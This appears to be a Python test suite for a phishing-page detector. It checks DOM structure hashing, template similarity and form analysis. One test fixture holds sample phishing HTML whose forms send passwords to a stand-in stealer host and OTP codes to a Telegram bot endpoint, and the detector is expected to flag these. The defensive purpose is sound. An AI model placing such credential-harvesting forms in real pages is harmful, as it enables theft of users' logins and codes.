from core import dom_analyzer


def test_dom_skeleton_and_hashing():
    # Две страницы с совершенно разным текстом и ID, но идентичной структурой
    html1 = """
    <!DOCTYPE html>
    <html>
    <head><title>Page 1</title></head>
    <body class="theme-light">
      <div id="main-container-12345">
        <h1>Welcome to Bank A</h1>
        <form action="/login" method="POST">
          <input type="text" name="user_123" placeholder="Username">
          <input type="password" name="pass_123" placeholder="Password">
          <button type="submit">Log in</button>
        </form>
      </div>
    </body>
    </html>
    """

    html2 = """
    <!DOCTYPE html>
    <html>
    <head><title>Completely Different Title</title></head>
    <body class="theme-dark">
      <div id="dynamic-uuid-99999">
        <h1>Здравствуйте, клиент Банка Б</h1>
        <form action="/login" method="POST">
          <input type="text" name="login_field" placeholder="Логин">
          <input type="password" name="password_field" placeholder="Пароль">
          <button type="submit">Войти</button>
        </form>
      </div>
    </body>
    </html>
    """

    skel1 = dom_analyzer.extract_dom_skeleton(html1)
    skel2 = dom_analyzer.extract_dom_skeleton(html2)

    assert skel1 == skel2, f"DOM остовы должны совпадать!\nSkel1: {skel1}\nSkel2: {skel2}"

    hash1 = dom_analyzer.compute_dom_hash(skel1)
    hash2 = dom_analyzer.compute_dom_hash(skel2)
    assert hash1 == hash2, "Хэши структурных остовов должны быть идентичны"
    assert len(hash1) == 64, "Хэш должен быть SHA-256 (64 hex-символа)"
    print("✅ test_dom_skeleton_and_hashing passed")


def test_simhash_similarity():
    base_html = "<div><header><nav><a></a><a></a></nav></header><main><form><input:text><input:password><button></button></form></main><footer></footer></div>"
    # Небольшая мутация (добавился один тег <p>)
    variant_html = "<div><header><nav><a></a><a></a></nav></header><main><p></p><form><input:text><input:password><button></button></form></main><footer></footer></div>"

    sh1 = dom_analyzer.compute_simhash(base_html)
    sh2 = dom_analyzer.compute_simhash(variant_html)

    similarity = dom_analyzer.simhash_similarity(sh1, sh2)
    assert similarity >= 0.80, f"Сходство шаблонов должно быть >= 80%, получено: {similarity}"
    print("✅ test_simhash_similarity passed")


def test_form_cross_domain_harvesting():
    phish_html = """
    <html>
    <body>
      <!-- Фишинговая форма с отправкой пароля на сторонний сервер C2 -->
      <form action="https://evil-stealer.xyz/gate.php" method="POST">
        <input type="text" name="email" value="">
        <input type="password" name="pwd">
        <input type="hidden" name="stealer_token" value="abc1234">
      </form>
      <!-- Форма с отправкой данных в Telegram bot -->
      <form action="https://api.telegram.org/bot123456789:AAEFakeTokenForTestingOnlyXYZ12345/sendMessage" method="POST">
        <input type="text" name="otp_code">
      </form>
    </body>
    </html>
    """

    res = dom_analyzer.analyze_forms_deep(phish_html, page_url_or_domain="https://legit-service.com/login")

    assert res["form_count"] == 2
    assert res["has_cross_domain_post"] is True, "Должна быть зафиксирована кросс-доменная отправка"
    assert res["has_credential_harvesting"] is True, "Должен быть зафиксирован сбор паролей"
    assert res["c2_webhook_detected"] == "telegram_bot_api", "Должен быть обнаружен Telegram Bot API C2"
    assert res["total_password_fields"] == 1
    print("✅ test_form_cross_domain_harvesting passed")


if __name__ == "__main__":
    test_dom_skeleton_and_hashing()
    test_simhash_similarity()
    test_form_cross_domain_harvesting()
    print("\n🎉 Все тесты DOM и форм успешно пройдены!")
